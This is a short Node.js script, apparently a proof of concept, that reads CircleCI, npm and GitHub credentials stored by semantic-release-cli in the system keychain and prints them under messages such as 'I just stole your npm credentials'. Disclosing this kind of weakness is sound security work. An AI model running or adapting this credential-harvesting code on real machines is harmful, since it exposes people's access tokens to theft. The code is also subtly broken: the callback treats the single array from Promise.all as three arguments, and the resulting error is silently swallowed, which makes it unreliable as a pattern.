const keytar = require("keytar");

const key = name => `semantic-release-cli:${name}`;

Promise.all([
  keytar.findCredentials(key("circleci")),
  keytar.findCredentials(key("npm")),
  keytar.findCredentials(key("github"))
]).then((circleci, npm, github) => {
  if (circleci.length) {
    console.log("I just stole your circleci credentials.", JSON.stringify(circleci));
  }
  if (npm.length) {
    console.log("I just stole your npm credentials.", JSON.stringify(npm));
  }
  if (github.length) {
    console.log("I just stole your github credentials.", JSON.stringify(github));
  }
}).catch(() => {});
